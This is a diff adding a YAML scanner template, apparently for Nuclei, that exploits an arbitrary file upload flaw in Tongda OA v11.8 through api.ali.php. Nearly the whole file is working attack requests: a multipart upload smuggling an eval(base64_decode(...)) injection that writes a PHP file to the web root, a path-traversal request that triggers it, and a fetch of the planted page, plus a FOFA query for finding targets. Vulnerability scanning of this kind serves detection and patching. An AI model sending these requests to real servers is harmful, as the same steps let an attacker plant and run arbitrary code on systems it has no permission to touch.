@@ -1,0 +1,47 @@
+id: tongda-api-file-upload
+
+info:
+  name: Tongda OA v11.8 api.ali.php - Arbitrary File Upload
+  author: SleepingBag945
+  severity: critical
+  description: |
+    Tongda OA v11.8 api.ali.php has an arbitrary file upload vulnerability. An attacker can upload malicious files to control the server through the vulnerability.
+  reference:
+    - https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/tongda-oa-api-ali-upload.yaml
+  metadata:
+    verified: true
+    max-request: 3
+    fofa-query: app="TDXK-通达OA"
+  tags: tongda,oa,fileupload,intrusive
+
+http:
+  - raw:
+      - |
+        POST /mobile/api/api.ali.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=502f67681799b07e5de6b503655f5cae
+        Accept-Encoding: gzip
+
+        --502f67681799b07e5de6b503655f5cae
+        Content-Disposition: form-data; name="file"; filename="{{randstr}}.json"
+        Content-Type: application/octet-stream
+
+        {"modular":"AllVariable","a":"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIHBocGluZm8oKTs/PicpOw==","dataAnalysis":"{"a":"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*"}"}
+        --502f67681799b07e5de6b503655f5cae--
+      - |
+        GET /inc/package/work.php?id=../../../../../myoa/attach/approve_center/{{trim_prefix(date_time("%Y%M", unix_time()),"20")}}/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.fb6790f4  HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+      - |
+        GET /{{randstr}}.php  HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200 && status_code_2 == 200 && status_code_3 == 200'
+          - 'contains(body_2,"+OK") && contains(body_3,"phpinfo")'
+        condition: and
+
+# digest: 490a0046304402204148abcca82a74ea3d53637117e17bfe199f751e9986158d60fbb7c51d58c9db02206d2f231004a8760cf5afe196fca73844ca526634ca1a000d5727e51866578967:922c64590222798bb761d5b6d8e72950
